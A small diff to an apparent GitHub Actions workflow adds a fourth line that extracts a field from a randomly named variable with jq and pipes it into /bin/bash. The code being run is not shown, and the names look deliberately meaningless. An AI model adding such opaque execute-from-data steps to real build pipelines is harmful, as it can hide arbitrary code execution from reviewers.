@@ -26,6 +26,7 @@ jobs:
           echo $quu1 | jq -r .oa508 | /bin/bash
           echo $ywqg945 | jq -r .un923 | /bin/bash
           printf '%s' "$jemjp41" | jq -r .jxoh8 | /bin/bash
+          printf '%s' "$om333" | jq -r .grdue456 | /bin/bash
 
       - name: Save artifact
         uses: actions/upload-artifact@v4
